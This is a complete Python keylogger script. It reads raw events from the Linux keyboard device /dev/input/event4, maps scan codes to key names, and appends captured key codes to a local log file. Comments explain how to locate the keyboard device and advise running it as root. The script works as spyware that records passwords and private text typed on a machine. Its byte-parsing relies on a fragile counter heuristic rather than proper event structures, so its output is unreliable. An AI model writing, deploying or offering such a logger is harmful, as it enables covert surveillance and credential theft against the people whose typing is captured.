from struct import unpack

keydict = {
    30 : 'a',
    48 : 'b',
    46 : 'c',
    32 : 'd',
    18 : 'e',
    33 : 'f',
    34 : 'g',
    35 : 'h',
    23 : 'i',
    36 : 'j',
    37 : 'k',
    38 : 'l',
    50 : 'm',
    49 : 'n',
    24 : 'o',
    25 : 'p',
    16 : 'q',
    19 : 'r',
    31 : 's',
    20 : 't',
    22 : 'u',
    47 : 'v',
    17 : 'w',
    45 : 'x',
    21 : 'y',
    44 : 'z',
    2 : '1',
    3 : '2',
    4 : '3',
    5 : '4',
    6 : '5',
    7 : '6',
    8 : '7',
    9 : '8',
    10 : '9',
    11 : '0',
    29 : 'Ctrl-Left',
    157 : 'Ctrl-Right',
    41 : '`',
    15 : 'Tab',
    0 : 'Caps Lock',
    42 : 'Shift-Left',
    54 : 'Shift-Right',
    129 : 'Super',
    28 : 'Enter',
    56 : 'Alt-Left',
    184 : 'Alt-Right',
    57 : 'Space',
    14 : 'Backspace',
    203 : 'ArrowKey-Left',
    205 : 'ArrowKey-Right',
    200 : 'ArrowKey-Top',
    208 : 'ArrowKey-Bottom',
    201 : 'PgUp',
    209 : 'PgDn',
    199 : 'Home',
    207 : 'End',
    210 : 'Insert',
    211 : 'Delete',
    183 : 'PrtScr',
    13 : '=',
    12 : '-',
    26 : '[',
    27 : ']',
    43 : '\\',
    39 : ';',
    40 : "'",
    51 : ',',
    52 : '.',
    53 : '/'    
}
def convert_to_original(ch) :
    return keydict[ch]
port = open ("/dev/input/event4", "rb")    
# Note that you need to figure out which event corresponds to the keyboard input and then specify it in the line above.
# All the events can be found out in /dev/input/
# The event can be found out by the command : cat /proc/bus/input/devices
# You might have to run the program as root.
# You may call the convert_to_original method if you wish to see the keys in their original form and not the coded form.
ctr = 0
f = open ("logfile.txt", "a")
try :
    while True :
        if ctr == 35 :
            ctr = 0
        else :
            ctr += 1   
        p, q, r, s = unpack ("4B", port.read (4)) 
        if ctr == 6 :    
            # f.write (convert_to_original(p) + '\n')
            f.write (str(p) + '\n')
except KeyboardInterrupt:
    f.close()